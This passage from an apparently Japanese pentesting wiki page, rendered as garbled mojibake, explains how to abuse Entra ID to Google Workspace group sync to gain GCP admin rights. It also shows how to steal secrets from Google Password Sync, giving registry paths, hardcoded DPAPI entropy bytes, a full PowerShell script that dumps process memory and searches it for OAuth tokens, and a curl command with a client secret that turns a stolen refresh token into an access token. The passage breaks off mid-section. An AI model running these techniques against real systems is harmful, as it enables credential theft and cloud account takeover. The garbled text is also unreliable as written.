åŒæœŸãŒè¡Œã‚ã‚Œã‚‹ã¨ã€**ADã‹ã‚‰ã™ã¹ã¦ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’åŒæœŸã™ã‚‹ã‹ã€ç‰¹å®šã®OUã‹ã‚‰ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ã¿ã‚’åŒæœŸã™ã‚‹ã‹ã€ã¾ãŸã¯EntraIDã®ç‰¹å®šã®ã‚°ãƒ«ãƒ¼ãƒ—ã®ãƒ¡ãƒ³ãƒãƒ¼ã®ã¿ã‚’åŒæœŸã™ã‚‹**å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã¯ã€åŒæœŸã•ã‚ŒãŸãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’æ”»æ’ƒã™ã‚‹ï¼ˆã¾ãŸã¯æ–°ã—ã„ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ä½œæˆã—ã¦åŒæœŸã•ã›ã‚‹ï¼‰ã«ã¯ã€ã¾ãšã©ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒåŒæœŸã•ã‚Œã¦ã„ã‚‹ã‹ã‚’ç‰¹å®šã™ã‚‹å¿…è¦ãŒã‚ã‚‹ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚

* ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯**ADã¾ãŸã¯EntraIDã‹ã‚‰ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å†åˆ©ç”¨ã—ã¦ã„ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ãŒã€ã“ã‚Œã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’**ä¾µå®³ã—ã¦ãƒ­ã‚°ã‚¤ãƒ³ã™ã‚‹å¿…è¦ãŒã‚ã‚‹ã“ã¨ã‚’æ„å‘³ã—ã¾ã™**ã€‚
* ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®**ãƒ¡ãƒ¼ãƒ«**ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹å ´åˆã€æ—¢å­˜ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®Workspaceãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’**å¤‰æ›´ã™ã‚‹**ã‹ã€**æ–°ã—ã„ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ä½œæˆ**ã—ã€ãã‚ŒãŒåŒæœŸã•ã‚Œã‚‹ã®ã‚’å¾…ã£ã¦ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’è¨­å®šã§ãã¾ã™ã€‚

Workspaceå†…ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨ã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã„ãã¤ã‹ã®**æ¨©é™ãŒä»˜ä¸ã•ã‚Œã‚‹**å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

#### ã‚°ãƒ«ãƒ¼ãƒ—ã¸ã®æ”»æ’ƒ

æœ€åˆã«ã©ã®ã‚°ãƒ«ãƒ¼ãƒ—ãŒåŒæœŸã•ã‚Œã¦ã„ã‚‹ã‹ã‚’ç‰¹å®šã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚**ã™ã¹ã¦ã®**ã‚°ãƒ«ãƒ¼ãƒ—ãŒåŒæœŸã•ã‚Œã¦ã„ã‚‹å¯èƒ½æ€§ã‚‚ã‚ã‚Šã¾ã™ï¼ˆWorkspaceã¯ã“ã‚Œã‚’è¨±å¯ã—ã¦ã„ã¾ã™ï¼‰ã€‚

{% hint style="info" %}
ã‚°ãƒ«ãƒ¼ãƒ—ã¨ãƒ¡ãƒ³ãƒãƒ¼ã‚·ãƒƒãƒ—ãŒWorkspaceã«ã‚¤ãƒ³ãƒãƒ¼ãƒˆã•ã‚Œã¦ã‚‚ã€**ãƒ¦ãƒ¼ã‚¶ãƒ¼åŒæœŸã§åŒæœŸã•ã‚Œã¦ã„ãªã„ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ã€ã‚°ãƒ«ãƒ¼ãƒ—åŒæœŸä¸­ã«ä½œæˆã•ã‚Œã¾ã›ã‚“**ã€‚ãŸã¨ãˆå½¼ã‚‰ãŒåŒæœŸã•ã‚ŒãŸã‚°ãƒ«ãƒ¼ãƒ—ã®ãƒ¡ãƒ³ãƒãƒ¼ã§ã‚ã£ã¦ã‚‚ã§ã™ã€‚
{% endhint %}

Azureã‹ã‚‰**Workspaceã¾ãŸã¯GCPã§æ¨©é™ãŒå‰²ã‚Šå½“ã¦ã‚‰ã‚Œã¦ã„ã‚‹ã‚°ãƒ«ãƒ¼ãƒ—**ã‚’çŸ¥ã£ã¦ã„ã‚‹å ´åˆã€ä¾µå®³ã•ã‚ŒãŸãƒ¦ãƒ¼ã‚¶ãƒ¼ï¼ˆã¾ãŸã¯æ–°ã—ãä½œæˆã•ã‚ŒãŸãƒ¦ãƒ¼ã‚¶ãƒ¼ï¼‰ã‚’ãã®ã‚°ãƒ«ãƒ¼ãƒ—ã«è¿½åŠ ã—ã€ãã®æ¨©é™ã‚’å–å¾—ã§ãã¾ã™ã€‚

Workspaceå†…ã®æ—¢å­˜ã®ç‰¹æ¨©ã‚°ãƒ«ãƒ¼ãƒ—ã‚’æ‚ªç”¨ã™ã‚‹åˆ¥ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ãŒã‚ã‚Šã¾ã™ã€‚ãŸã¨ãˆã°ã€ã‚°ãƒ«ãƒ¼ãƒ—`gcp-organization-admins@<workspace.email>`ã¯é€šå¸¸ã€GCPã«å¯¾ã—ã¦é«˜ã„æ¨©é™ã‚’æŒã£ã¦ã„ã¾ã™ã€‚

ãŸã¨ãˆã°ã€EntraIDã‹ã‚‰Workspaceã¸ã®åŒæœŸãŒ**ã‚¤ãƒ³ãƒãƒ¼ãƒˆã•ã‚ŒãŸã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ãƒ‰ãƒ¡ã‚¤ãƒ³ã‚’**Workspaceã®ãƒ¡ãƒ¼ãƒ«ã§**ç½®ãæ›ãˆã‚‹ã‚ˆã†ã«æ§‹æˆã•ã‚Œã¦ã„ã‚‹å ´åˆã€æ”»æ’ƒè€…ã¯EntraIDã«`gcp-organization-admins@<entraid.email>`ã¨ã„ã†ã‚°ãƒ«ãƒ¼ãƒ—ã‚’ä½œæˆã—ã€ãã®ã‚°ãƒ«ãƒ¼ãƒ—ã«ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’è¿½åŠ ã—ã€ã™ã¹ã¦ã®ã‚°ãƒ«ãƒ¼ãƒ—ã®åŒæœŸãŒè¡Œã‚ã‚Œã‚‹ã®ã‚’å¾…ã¤ã“ã¨ãŒã§ãã¾ã™ã€‚\
**ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ã‚°ãƒ«ãƒ¼ãƒ—`gcp-organization-admins@<workspace.email>`ã«è¿½åŠ ã•ã‚Œã€GCPã§ã®æ¨©é™ãŒæ˜‡æ ¼ã—ã¾ã™ã€‚**

### Google Workspace -> AD/EntraID

Workspaceã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã‚°ãƒ«ãƒ¼ãƒ—ã‚’åŒæœŸã™ã‚‹ãŸã‚ã«ADã¾ãŸã¯EntraIDã«å¯¾ã™ã‚‹èª­ã¿å–ã‚Šå°‚ç”¨ã‚¢ã‚¯ã‚»ã‚¹ã®è³‡æ ¼æƒ…å ±ã‚’å¿…è¦ã¨ã—ã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€Google Workspaceã‚’æ‚ªç”¨ã—ã¦ADã¾ãŸã¯EntraIDã«å¤‰æ›´ã‚’åŠ ãˆã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚ã—ãŸãŒã£ã¦ã€**ç¾æ™‚ç‚¹ã§ã¯ã“ã‚Œã¯ä¸å¯èƒ½ã§ã™**ã€‚

ã¾ãŸã€GoogleãŒADã®è³‡æ ¼æƒ…å ±ã‚„EntraIDãƒˆãƒ¼ã‚¯ãƒ³ã‚’ã©ã“ã«ä¿å­˜ã—ã¦ã„ã‚‹ã‹ã¯ã‚ã‹ã‚Šã¾ã›ã‚“ã—ã€**åŒæœŸã‚’å†æ§‹æˆã—ã¦ã‚‚ãã‚Œã‚‰ã‚’å›å¾©ã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“**ï¼ˆã‚¦ã‚§ãƒ–ãƒ•ã‚©ãƒ¼ãƒ ã«ã¯è¡¨ç¤ºã•ã‚Œãšã€å†åº¦æä¾›ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼‰ã€‚ãŸã ã—ã€ã‚¦ã‚§ãƒ–ã‹ã‚‰ã¯ç¾åœ¨ã®æ©Ÿèƒ½ã‚’æ‚ªç”¨ã—ã¦**ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã‚°ãƒ«ãƒ¼ãƒ—ã‚’ãƒªã‚¹ãƒˆã™ã‚‹**ã“ã¨ãŒå¯èƒ½ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚

## GPS - Googleãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰åŒæœŸ

ã“ã‚Œã¯ã€GoogleãŒ**ADã¨Workspaceé–“ã§ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’åŒæœŸã•ã›ã‚‹ãŸã‚ã«æä¾›ã™ã‚‹ãƒã‚¤ãƒŠãƒªã¨ã‚µãƒ¼ãƒ“ã‚¹**ã§ã™ã€‚ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒADã§ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å¤‰æ›´ã™ã‚‹ãŸã³ã«ã€ãã‚Œã¯Googleã«è¨­å®šã•ã‚Œã¾ã™ã€‚

`C:\Program Files\Google\Password Sync`ã«ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚Œã€ã“ã“ã§è¨­å®šã™ã‚‹ãŸã‚ã®ãƒã‚¤ãƒŠãƒª`PasswordSync.exe`ã¨ã€å®Ÿè¡Œã‚’ç¶šã‘ã‚‹ã‚µãƒ¼ãƒ“ã‚¹`password_sync_service.exe`ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### GPS - è¨­å®š

ã“ã®ãƒã‚¤ãƒŠãƒªï¼ˆãŠã‚ˆã³ã‚µãƒ¼ãƒ“ã‚¹ï¼‰ã‚’æ§‹æˆã™ã‚‹ã«ã¯ã€**Workspaceå†…ã®Super Adminãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’ä¸ãˆã‚‹**å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼š

* Googleã§**OAuth**ã‚’ä»‹ã—ã¦ãƒ­ã‚°ã‚¤ãƒ³ã—ã€ãã®å¾Œ**ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ãƒ¬ã‚¸ã‚¹ãƒˆãƒªã«ä¿å­˜ã—ã¾ã™ï¼ˆæš—å·åŒ–ã•ã‚Œã¾ã™ï¼‰**
* GUIã‚’æŒã¤ãƒ‰ãƒ¡ã‚¤ãƒ³ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ©ãƒ¼ã§ã®ã¿åˆ©ç”¨å¯èƒ½
* **Workspaceãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ç®¡ç†ã™ã‚‹**æ¨©é™ã‚’æŒã¤GCPã®**ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆè³‡æ ¼æƒ…å ±**ï¼ˆjsonãƒ•ã‚¡ã‚¤ãƒ«ï¼‰ã‚’æä¾›
* ã“ã‚Œã‚‰ã®è³‡æ ¼æƒ…å ±ã¯æœŸé™åˆ‡ã‚Œã«ãªã‚‰ãšã€æ‚ªç”¨ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚‹ãŸã‚éå¸¸ã«æ‚ªã„ã‚¢ã‚¤ãƒ‡ã‚¢
* ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆãŒGCPã§ä¾µå®³ã•ã‚Œã€Workspaceã«ãƒ”ãƒœãƒƒãƒˆã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚‹ãŸã‚ã€Workspaceã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«ä¸ãˆã‚‹ã®ã¯éå¸¸ã«æ‚ªã„ã‚¢ã‚¤ãƒ‡ã‚¢
* GUIãªã—ã®ãƒ‰ãƒ¡ã‚¤ãƒ³ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ«ç”¨ã«GoogleãŒè¦æ±‚
* ã“ã‚Œã‚‰ã®è³‡æ ¼æƒ…å ±ã‚‚ãƒ¬ã‚¸ã‚¹ãƒˆãƒªã«ä¿å­˜ã•ã‚Œã¾ã™

ADã«é–¢ã—ã¦ã¯ã€ç¾åœ¨ã®**ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã€åŒ¿åã¾ãŸã¯ç‰¹å®šã®è³‡æ ¼æƒ…å ±**ã‚’ä½¿ç”¨ã™ã‚‹ã‚ˆã†ã«æŒ‡ç¤ºã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚è³‡æ ¼æƒ…å ±ã‚ªãƒ—ã‚·ãƒ§ãƒ³ãŒé¸æŠã•ã‚ŒãŸå ´åˆã€**ãƒ¦ãƒ¼ã‚¶ãƒ¼å**ã¯**ãƒ‡ã‚£ã‚¹ã‚¯**å†…ã®ãƒ•ã‚¡ã‚¤ãƒ«ã«ä¿å­˜ã•ã‚Œã€**ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰**ã¯**æš—å·åŒ–**ã•ã‚Œã¦**ãƒ¬ã‚¸ã‚¹ãƒˆãƒª**ã«ä¿å­˜ã•ã‚Œã¾ã™ã€‚

### GPS - ãƒ‡ã‚£ã‚¹ã‚¯ã‹ã‚‰ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã¨ãƒˆãƒ¼ã‚¯ãƒ³ã®ãƒ€ãƒ³ãƒ—

{% hint style="success" %}
[**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe)ã¯ã€**GPS**ã‚’æ¤œå‡ºã—ã€æ§‹æˆã«é–¢ã™ã‚‹æƒ…å ±ã‚’å–å¾—ã—ã€**ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã¨ãƒˆãƒ¼ã‚¯ãƒ³ã‚’å¾©å·åŒ–ã™ã‚‹**ã“ã¨ãŒã§ãã¾ã™ã€‚
{% endhint %}

ãƒ•ã‚¡ã‚¤ãƒ«**`C:\ProgramData\Google\Google Apps Password Sync\config.xml`**ã«ã¯ã€è¨­å®šã•ã‚ŒãŸADã®**`baseDN`**ã‚„ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹è³‡æ ¼æƒ…å ±ã®**`username`**ã®ä¸€éƒ¨ãŒè¦‹ã¤ã‹ã‚Šã¾ã™ã€‚

ãƒ¬ã‚¸ã‚¹ãƒˆãƒª**`HKLM\Software\Google\Google Apps Password Sync`**ã«ã¯ã€**æš—å·åŒ–ã•ã‚ŒãŸãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ãƒˆãƒ¼ã‚¯ãƒ³**ã‚„ADãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãŸã‚ã®**æš—å·åŒ–ã•ã‚ŒãŸãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰**ï¼ˆå­˜åœ¨ã™ã‚‹å ´åˆï¼‰ãŒè¦‹ã¤ã‹ã‚Šã¾ã™ã€‚ã•ã‚‰ã«ã€ãƒˆãƒ¼ã‚¯ãƒ³ã®ä»£ã‚ã‚Šã«**ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®è³‡æ ¼æƒ…å ±**ãŒä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹å ´åˆã€ãã‚Œã‚‰ã‚‚ãã®ãƒ¬ã‚¸ã‚¹ãƒˆãƒªã‚¢ãƒ‰ãƒ¬ã‚¹ã«æš—å·åŒ–ã•ã‚Œã¦ä¿å­˜ã•ã‚Œã¾ã™ã€‚ã“ã®ãƒ¬ã‚¸ã‚¹ãƒˆãƒªå†…ã®**å€¤**ã¯**ç®¡ç†è€…**ã®ã¿ãŒ**ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½**ã§ã™ã€‚

æš—å·åŒ–ã•ã‚ŒãŸ**ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰**ï¼ˆå­˜åœ¨ã™ã‚‹å ´åˆï¼‰ã¯ã€ã‚­ãƒ¼**`ADPassword`**å†…ã«ã‚ã‚Šã€**`CryptProtectData`** APIã‚’ä½¿ç”¨ã—ã¦æš—å·åŒ–ã•ã‚Œã¦ã„ã¾ã™ã€‚ã“ã‚Œã‚’å¾©å·åŒ–ã™ã‚‹ã«ã¯ã€ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰åŒæœŸã‚’æ§‹æˆã—ãŸã®ã¨åŒã˜ãƒ¦ãƒ¼ã‚¶ãƒ¼ã§ã‚ã‚‹å¿…è¦ãŒã‚ã‚Šã€**`CryptUnprotectData`**ã‚’ä½¿ç”¨ã™ã‚‹éš›ã«ã“ã®**ã‚¨ãƒ³ãƒˆãƒ­ãƒ”ãƒ¼**ã‚’ä½¿ç”¨ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼š`byte[] entropyBytes = new byte[] { 0xda, 0xfc, 0xb2, 0x8d, 0xa0, 0xd5, 0xa8, 0x7c, 0x88, 0x8b, 0x29, 0x51, 0x34, 0xcb, 0xae, 0xe9 };`

æš—å·åŒ–ã•ã‚ŒãŸãƒˆãƒ¼ã‚¯ãƒ³ï¼ˆå­˜åœ¨ã™ã‚‹å ´åˆï¼‰ã¯ã€ã‚­ãƒ¼**`AuthToken`**å†…ã«ã‚ã‚Šã€**`CryptProtectData`** APIã‚’ä½¿ç”¨ã—ã¦æš—å·åŒ–ã•ã‚Œã¦ã„ã¾ã™ã€‚ã“ã‚Œã‚’å¾©å·åŒ–ã™ã‚‹ã«ã¯ã€ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰åŒæœŸã‚’æ§‹æˆã—ãŸã®ã¨åŒã˜ãƒ¦ãƒ¼ã‚¶ãƒ¼ã§ã‚ã‚‹å¿…è¦ãŒã‚ã‚Šã€**`CryptUnprotectData`**ã‚’ä½¿ç”¨ã™ã‚‹éš›ã«ã“ã®**ã‚¨ãƒ³ãƒˆãƒ­ãƒ”ãƒ¼**ã‚’ä½¿ç”¨ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼š`byte[] entropyBytes = new byte[] { 0x00, 0x14, 0x0b, 0x7e, 0x8b, 0x18, 0x8f, 0x7e, 0xc5, 0xf2, 0x2d, 0x6e, 0xdb, 0x95, 0xb8, 0x5b };`\
ã•ã‚‰ã«ã€ã“ã‚Œã¯**`0123456789abcdefghijklmnopqrstv`**ã¨ã„ã†è¾æ›¸ã‚’ä½¿ç”¨ã—ã¦base32hexã§ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã•ã‚Œã¦ã„ã¾ã™ã€‚

ã‚¨ãƒ³ãƒˆãƒ­ãƒ”ãƒ¼å€¤ã¯ã€ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦è¦‹ã¤ã‹ã‚Šã¾ã—ãŸã€‚ã“ã®ãƒ„ãƒ¼ãƒ«ã¯ã€**`CryptUnprotectData`**ãŠã‚ˆã³**`CryptProtectData`**ã¸ã®å‘¼ã³å‡ºã—ã‚’ç›£è¦–ã™ã‚‹ã‚ˆã†ã«æ§‹æˆã•ã‚Œã€ãã®å¾Œã€`PasswordSync.exe`ã‚’èµ·å‹•ã—ã¦ç›£è¦–ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã€ã“ã‚Œã«ã‚ˆã‚Šæ§‹æˆã•ã‚ŒãŸãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã¨èªè¨¼ãƒˆãƒ¼ã‚¯ãƒ³ãŒæœ€åˆã«å¾©å·åŒ–ã•ã‚Œã€ãƒ„ãƒ¼ãƒ«ã¯**ä½¿ç”¨ã•ã‚ŒãŸã‚¨ãƒ³ãƒˆãƒ­ãƒ”ãƒ¼ã®å€¤ã‚’è¡¨ç¤ºã—ã¾ã™**ï¼š

<figure><img src="../../.gitbook/assets/telegram-cloud-photo-size-4-5782633230648853886-y.jpg" alt=""><figcaption></figcaption></figure>

ã“ã‚Œã‚‰ã®APIã¸ã®å‘¼ã³å‡ºã—ã®å…¥åŠ›ã¾ãŸã¯å‡ºåŠ›ã§**å¾©å·åŒ–ã•ã‚ŒãŸ**å€¤ã‚’è¦‹ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™ï¼ˆWinpeasãŒå‹•ä½œã‚’åœæ­¢ã—ãŸå ´åˆã«å‚™ãˆã¦ï¼‰ã€‚

ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰åŒæœŸãŒ**ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®è³‡æ ¼æƒ…å ±ã§æ§‹æˆã•ã‚Œã¦ã„ã‚‹**å ´åˆã€ãã‚Œã‚‚ãƒ¬ã‚¸ã‚¹ãƒˆãƒªå†…ã®ã‚­ãƒ¼**`HKLM\Software\Google\Google Apps Password Sync`**ã«ä¿å­˜ã•ã‚Œã¾ã™ã€‚

### GPS - ãƒ¡ãƒ¢ãƒªã‹ã‚‰ã®ãƒˆãƒ¼ã‚¯ãƒ³ã®ãƒ€ãƒ³ãƒ—

GCPWã¨åŒæ§˜ã«ã€`PasswordSync.exe`ãŠã‚ˆã³`password_sync_service.exe`ãƒ—ãƒ­ã‚»ã‚¹ã®ãƒ¡ãƒ¢ãƒªã‚’ãƒ€ãƒ³ãƒ—ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã€ãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ãƒˆãƒ¼ã‚¯ãƒ³ã¨ã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³ï¼ˆã™ã§ã«ç”Ÿæˆã•ã‚Œã¦ã„ã‚‹å ´åˆï¼‰ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
ADã«è¨­å®šã•ã‚ŒãŸè³‡æ ¼æƒ…å ±ã‚‚è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã‚‹ã¨æ€ã„ã¾ã™ã€‚

<details>

<summary><code>PasswordSync.exe</code>ãŠã‚ˆã³<code>password_sync_service.exe</code>ãƒ—ãƒ­ã‚»ã‚¹ã‚’ãƒ€ãƒ³ãƒ—ã—ã¦ãƒˆãƒ¼ã‚¯ãƒ³ã‚’æ¤œç´¢</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Show EULA if it wasn't accepted yet for strings
$stringsPath

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$processNames = @("PasswordSync", "password_sync_service")
$chromeProcesses = Get-Process | Where-Object { $processNames -contains $_.Name } | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}
```
</details>

### GPS - ãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ãƒˆãƒ¼ã‚¯ãƒ³ã‹ã‚‰ã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç”Ÿæˆã™ã‚‹

ãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä½¿ç”¨ã—ã¦ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã§æŒ‡å®šã•ã‚ŒãŸã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆIDã¨ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’ä½¿ç”¨ã—ã¦ã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç”Ÿæˆã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
https://www.googleapis.com/oauth2/v4/token
```
### GPS - ã‚¹ã‚³ãƒ¼ãƒ—

{% hint style="info" %}
ãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ãƒˆãƒ¼ã‚¯ãƒ³ã‚’æŒã£ã¦ã„ã¦ã‚‚ã€ã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³ã®ãŸã‚ã«ãƒªã‚¯ã‚¨ã‚¹ãƒˆã§ãã‚‹ã‚¹ã‚³ãƒ¼ãƒ—ã¯ã€ã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç”Ÿæˆã—ã¦ã„ã‚‹ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§ã‚µãƒãƒ¼ãƒˆã•ã‚Œã¦ã„ã‚‹**ã‚¹ã‚³ãƒ¼ãƒ—ã®ã¿**ã§ã™ã€‚

ã¾ãŸã€ãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ãƒˆãƒ¼ã‚¯ãƒ³ã¯ã™ã¹ã¦ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§æœ‰åŠ¹ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚
{% endhint %}

ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€GPSã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã—ã¦ã™ã¹ã¦ã®å¯èƒ½ãªOAuthã‚¹ã‚³ãƒ¼ãƒ—ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ããªã„ãŸã‚ã€æ¬¡ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ä½¿ç”¨ã—ã¦ã€`refresh_token`ã‚’ä½¿ç”¨ã—ã¦`access_token`ã‚’ç”Ÿæˆã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã‚‹ã‚¹ã‚³ãƒ¼ãƒ—ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

<details>

